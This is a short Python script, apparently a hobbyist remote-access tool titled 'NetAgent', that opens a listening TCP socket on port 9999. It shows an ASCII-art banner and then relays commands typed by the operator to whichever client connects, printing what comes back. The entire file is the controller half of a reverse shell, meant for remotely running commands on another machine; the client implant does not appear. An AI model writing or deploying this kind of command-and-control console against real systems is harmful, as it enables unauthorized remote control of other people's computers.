
import socket
from colorama import Fore, Back, Style



def socket_create():
    global host, port, s
    host = "add your IP"
    port = 9999
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    s.listen(1)

socket_create()

print(Back.BLACK+Fore.YELLOW+"""



 ██████   █████           █████      █████████                                 █████   
░░██████ ░░███           ░░███      ███░░░░░███                               ░░███    
 ░███░███ ░███   ██████  ███████   ░███    ░███   ███████  ██████  ████████   ███████  
 ░███░░███░███  ███░░███░░░███░    ░███████████  ███░░███ ███░░███░░███░░███ ░░░███░   
 ░███ ░░██████ ░███████   ░███     ░███░░░░░███ ░███ ░███░███████  ░███ ░███   ░███    
 ░███  ░░█████ ░███░░░    ░███ ███ ░███    ░███ ░███ ░███░███░░░   ░███ ░███   ░███ ███
 █████  ░░█████░░██████   ░░█████  █████   █████░░███████░░██████  ████ █████  ░░█████ 
░░░░░    ░░░░░  ░░░░░░     ░░░░░  ░░░░░   ░░░░░  ░░░░░███ ░░░░░░  ░░░░ ░░░░░    ░░░░░  
                                                 ███ ░███                              
                                                ░░██████                               
                                                 ░░░░░░                       by sudo-scorpion""")

print(Style.RESET_ALL)

while True:
    print(Fore.GREEN+f'[*] listening as {host}:{port}')
    conn, addr = s.accept()
    print(Fore.GREEN+f'[+] client connected {addr}')

    conn.send(b'connected')


    while True:
        cmd = input('>>> ')
        conn.send(cmd.encode())

        if cmd.lower() in ['q', 'quit', 'x', 'exit']:
            break

        result = conn.recv(1024).decode()
        print(result)

    conn.close()

    if input(Fore.RED+'Wait for new client y/n ') == 'n':
        break

s.close()
